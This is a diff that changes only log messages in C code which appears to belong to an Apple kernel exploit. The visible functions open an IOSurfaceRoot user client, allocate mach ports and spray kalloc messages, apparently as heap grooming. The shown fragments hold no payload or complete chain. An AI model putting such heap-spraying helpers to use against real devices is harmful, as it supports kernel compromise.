@@ -150,13 +150,13 @@ static void prepare_user_client() {
   io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
   
   if (service == IO_OBJECT_NULL){
-    LOG(" [-] unable to find service\n");
+    LOG("unable to find service\n");
     exit(EXIT_FAILURE);
   }
   
   err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
   if (err != KERN_SUCCESS){
-    LOG(" [-] unable to get user client connection\n");
+    LOG("unable to get user client connection\n");
     exit(EXIT_FAILURE);
   }
   
@@ -169,7 +169,7 @@ mach_port_t* prepare_ports(int n_ports) {
     kern_return_t err;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
     if (err != KERN_SUCCESS) {
-      LOG(" [-] failed to allocate port\n");
+      LOG("failed to allocate port\n");
       exit(EXIT_FAILURE);
     }
   }
@@ -198,7 +198,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
   kern_return_t err;
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
   if (err != KERN_SUCCESS) {
-    LOG(" [-] failed to allocate port\n");
+    LOG("failed to allocate port\n");
     exit(EXIT_FAILURE);
   }
   
@@ -210,7 +210,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
                                  (mach_port_info_t)&limits,
                                  MACH_PORT_LIMITS_INFO_COUNT);
   if (err != KERN_SUCCESS) {
-    LOG(" [-] failed to increase queue limit\n");
+    LOG("failed to increase queue limit\n");
     exit(EXIT_FAILURE);
   }
   
@@ -236,7 +236,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
                    MACH_PORT_NULL);
     
     if (err != KERN_SUCCESS) {
-      LOG(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
+      LOG("failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
       exit(EXIT_FAILURE);
     }
   }
